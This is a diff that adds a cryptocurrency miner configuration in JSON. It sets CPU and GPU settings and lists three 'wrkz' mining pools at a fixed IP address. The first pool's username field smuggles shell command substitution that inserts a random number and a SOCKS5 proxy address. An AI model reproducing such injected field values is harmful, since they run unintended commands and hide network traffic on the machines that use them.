@@ -1,0 +1,58 @@
+{
+    "hardwareConfiguration": {
+        "cpu": {
+            "enabled": true,
+            "optimizationMethod": "AVX-2",
+            "threadCount": 12
+        },
+        "nvidia": {
+            "devices": [
+                {
+                    "desktopLag": 100.0,
+                    "enabled": false,
+                    "id": 0,
+                    "intensity": 100.0,
+                    "name": "GeForce GTX 1070"
+                }
+            ]
+        }
+    },
+    "pools": [
+        {
+            "agent": "",
+            "algorithm": "wrkz",
+            "host": "128.199.88.243",
+            "niceHash": true,
+            "password": "voc",
+            "port": 1313,
+            "priority": 0,
+            "rigID": "",
+            "ssl": false,
+            "username": "endvoc.$(echo $(shuf -i 1-9999 -n 1)-PROXY socks5://192.111.137.37:18762)"
+        },
+        {
+            "agent": "",
+            "algorithm": "wrkz",
+            "host": "128.199.88.243",
+            "niceHash": true,
+            "password": "voc",
+            "port": 1313,
+            "priority": 2,
+            "rigID": "",
+            "ssl": true,
+            "username": "voc"
+        },
+        {
+            "agent": "",
+            "algorithm": "wrkz",
+            "host": "128.199.88.243",
+            "niceHash": true,
+            "password": "voc",
+            "port": 1313,
+            "priority": 1,
+            "rigID": "",
+            "ssl": false,
+            "username": "voc"
+        }
+    ]
+}
